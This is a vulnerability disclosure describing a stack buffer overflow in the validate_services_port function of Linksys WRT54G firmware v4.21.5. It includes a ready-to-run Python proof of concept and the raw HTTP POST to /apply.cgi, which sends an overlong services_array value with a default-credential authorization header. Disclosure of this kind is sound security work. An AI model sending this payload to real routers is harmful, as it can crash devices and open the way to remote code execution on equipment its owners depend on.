# Overview
Product overview [https://store.linksys.com/support-product?sku=WRT54G](https://store.linksys.com/support-product?sku=WRT54G)

# Affected version
Linksys WRT54G Firmware v4.21.5
# Vulnerability details
The Linksys WRT54G Firmware v4.21.5 has a stack overflow vulnerability in validate_services_port function. The variable `services_array`receives the parameter from a POST request.  In line 55, the sscanf function parse POST parameter to v22. the v22 variable is stack-allocated and has a size of only 80 characters. If the variable exceeds this length, it can result in a buffer overflow vulnerability, potentially leading to remote code execution or denial-of-service attacks.  ![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723539680779-8e6e55c4-873d-4b66-9524-c8699c3c0485.png#averageHue=%23fefefe&clientId=udff17b68-8ebb-4&from=paste&height=377&id=uc73b9e8a&originHeight=761&originWidth=1247&originalType=binary&ratio=1&rotation=0&showTitle=false&size=79662&status=done&style=none&taskId=u319299d9-3363-402e-88bd-d0bac8dcc79&title=&width=618)
# POC
```python
import requests

url = 'http://192.168.1.1/apply.cgi'
headers = {
    'Host': '192.168.1.1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://192.168.1.1',
    'Authorization': 'Basic OmFkbWlu',
    'Connection': 'close',
    'Referer': 'http://192.168.1.1/WanMAC.asp',
    'Upgrade-Insecure-Requests': '1',
    'Priority': 'u=1',
}

payload = ('submit_button=Port_Services&submit_type=save_services&action=Apply&change_action=gozila_cgi&services_array=1:1:1:111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&services_length=1')

response = requests.post(url, headers=headers, data=payload)

print('Status:', response.status_code)
print('Response:', response.text)

```
```
POST /apply.cgi HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 197
Origin: http://192.168.1.1
Authorization: Basic OmFkbWlu
Connection: close
Referer: http://192.168.1.1/WanMAC.asp
Upgrade-Insecure-Requests: 1
Priority: u=1

submit_button=Port_Services&submit_type=save_services&action=Apply&change_action=gozila_cgi&services_array=1:1:1:111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&services_length=1
```

